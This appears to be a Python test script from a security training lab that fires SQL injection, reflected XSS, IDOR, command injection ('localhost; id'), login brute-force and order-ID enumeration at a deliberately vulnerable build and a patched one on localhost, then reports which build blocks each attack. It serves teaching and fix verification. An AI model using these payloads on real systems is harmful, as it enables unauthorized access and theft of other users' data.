#!/usr/bin/env python3
"""Run the four lab attacks against the vulnerable and the patched build (standard library only).

  python scripts/run_attacks.py            # test both builds, print a table
  python scripts/run_attacks.py --noisy    # also brute-force and enumerate (creates more log events for detection)
  python scripts/run_attacks.py --check    # exit 1 if the vulnerable build is NOT exploitable or the patched one IS

Only point this at the lab containers on 127.0.0.1.
"""
import argparse
import http.cookiejar
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

TARGETS = {"vulnerable": "http://127.0.0.1:8081", "patched": "http://127.0.0.1:8082"}


class Client:
    def __init__(self, base):
        self.base = base
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))

    def req(self, method, path, data=None):
        body = urllib.parse.urlencode(data).encode() if data is not None else None
        r = urllib.request.Request(self.base + path, data=body, method=method)
        try:
            with self.opener.open(r, timeout=8) as resp:
                return resp.status, resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", "replace")

    def login(self, user, pw):
        return self.req("POST", "/login", {"username": user, "password": pw})


def test_sqli(base):
    c = Client(base)
    status, body = c.login("admin' --", "x")
    return status == 200 and "Welcome admin" in body, f"login as admin with username [admin' --]: HTTP {status}"


def test_sqli_tautology(base):
    c = Client(base)
    status, body = c.login("admin", "' OR '1'='1")
    return status == 200 and "Welcome" in body, f"login with password [' OR '1'='1]: HTTP {status}"


def test_xss(base):
    payload = "<script>alert(1)</script>"
    status, body = Client(base).req("GET", "/search?q=" + urllib.parse.quote(payload))
    return payload in body, f"raw payload reflected in page: {payload in body}"


def test_idor(base):
    c = Client(base)
    c.login("priya", "priya123")
    status, body = c.req("GET", "/api/orders/1002")             # 1002 belongs to ravi
    return status == 200 and "Ravi" in body, f"priya reads ravi's order 1002: HTTP {status}"


def test_cmdi(base):
    status, body = Client(base).req("GET", "/tools/lookup?host=" + urllib.parse.quote("localhost; id"))
    return "uid=" in body, f"injected 'id' output present: {'uid=' in body} (HTTP {status})"


def test_normal(base):
    c = Client(base)
    ok_login = c.login("priya", "priya123")[0] == 200
    ok_own = c.req("GET", "/api/orders/1001")[0] == 200
    return ok_login and ok_own, "normal login and own order still work"


TESTS = [("SQL injection (comment out password)", test_sqli), ("SQL injection (tautology)", test_sqli_tautology),
         ("Reflected XSS", test_xss), ("IDOR (read another user's order)", test_idor), ("Command injection", test_cmdi)]


def noisy(base):
    c = Client(base)
    for i in range(8):                                           # brute force: 8 failed logins
        c.login("admin", f"guess{i}")
    c.login("priya", "priya123")
    leaked = 0
    for oid in range(1000, 1011):                                # ID enumeration
        status, _ = c.req("GET", f"/api/orders/{oid}")
        leaked += status == 200
    return leaked


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--noisy", action="store_true")
    ap.add_argument("--check", action="store_true")
    args = ap.parse_args()
    results, problems = {}, []
    for name, base in TARGETS.items():
        try:
            Client(base).req("GET", "/healthz")
        except Exception as exc:
            sys.exit(f"Cannot reach {name} build at {base}: {exc}\nStart the lab first: docker compose up --build")
        results[name] = {t: fn(base) for t, fn in TESTS}
        ok, why = test_normal(base)
        if not ok:
            problems.append(f"{name}: {why} FAILED")
    print(f"\n{'Attack':42} {'vulnerable build':20} {'patched build':20}")
    print("-" * 84)
    for t, _ in TESTS:
        v, p = results["vulnerable"][t][0], results["patched"][t][0]
        print(f"{t:42} {'EXPLOITED' if v else 'not exploitable':20} {'EXPLOITED' if p else 'blocked':20}")
        if not v: problems.append(f"vulnerable build should be exploitable: {t}")
        if p: problems.append(f"patched build should block: {t}")
    if args.noisy:
        for name, base in TARGETS.items():
            print(f"noisy run on {name}: {noisy(base)} order records returned for IDs 1000-1010 (own orders included)")
    print()
    if problems:
        print("PROBLEMS:\n  " + "\n  ".join(problems))
        sys.exit(1 if args.check else 0)
    print("Result: vulnerable build exploitable, patched build blocks everything, normal use still works.")


if __name__ == "__main__":
    main()
